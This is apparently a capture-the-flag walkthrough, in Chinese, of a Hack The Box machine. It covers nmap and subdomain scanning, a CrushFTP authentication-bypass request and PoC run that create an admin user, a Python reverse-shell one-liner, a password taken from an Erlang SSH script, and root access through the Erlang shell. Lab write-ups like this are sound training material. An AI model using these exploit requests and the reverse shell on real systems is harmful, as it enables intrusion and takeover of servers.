## 扫描
```SHELL
# nmap
$ nmap -sV -A 10.10.11.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 20:55 EDT
Nmap scan report for 10.10.11.86
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   175.19 ms 10.10.16.1
2   124.79 ms 10.10.11.86

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.45 seconds
# 子域名
$ ffuf -u http://soulmate.htb/ -H "Host:FUZZ.soulmate.htb" -w /home/kali/Desktop/dic/subdomainDicts/main.txt -fw 4 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /home/kali/Desktop/dic/subdomainDicts/main.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 257ms]
:: Progress: [167378/167378] :: Job [1/1] :: 280 req/sec :: Duration: [0:10:22] :: Errors: 0 ::
```

## CVE-2025-2825&&CVE-2025-31161(CrushFTP)
```SHELL
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=aaaa HTTP/1.1
Host: ftp.soulmate.htb
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://ftp.soulmate.htb
Referer: http://ftp.soulmate.htb/WebInterface/UserManager/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CrushAuth=1111111111111_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Connection: close


```
![](attachments/Pasted%20image%2020250917095757.png)

[CrushFTP 身份验证绕过漏洞(CVE-2025-2825)-先知社区](https://xz.aliyun.com/news/17728)
添加任意用户
[GitHub - Immersive-Labs-Sec/CVE-2025-31161: Proof of Concept for CVE-2025-31161 / CVE-2025-2825](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

```SHELL
$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user wum0nster --password 123456
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: wum0nster
   [*] Password: 123456.
```

![](attachments/Pasted%20image%2020250917100420.png)

ben用户对网站目录有操作权限，修改密码并登陆，再上传shell
![](attachments/Pasted%20image%2020250917101309.png)
![](attachments/Pasted%20image%2020250917101259.png)


```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.64",23456));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'


```

```shell
HouseH0ldings998
```
## root
上传linpeas，存在erlang启动脚本

![](attachments/Pasted%20image%2020250917115228.png)

```BASH
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.

```

拿到ben用户登陆密码，先拿user.txt，在登陆2222上的ssh

```SHELL
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                        
══╣ Active Ports (netstat)                                                                                          
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:32849         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:38473         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:4369                :::*                    LISTEN      -                   

```

使用ben连接再2222端口开放的ssh服务，`m().`发现存在os模块，使用os查找root.txt

![](attachments/Pasted%20image%2020250917114137.png)

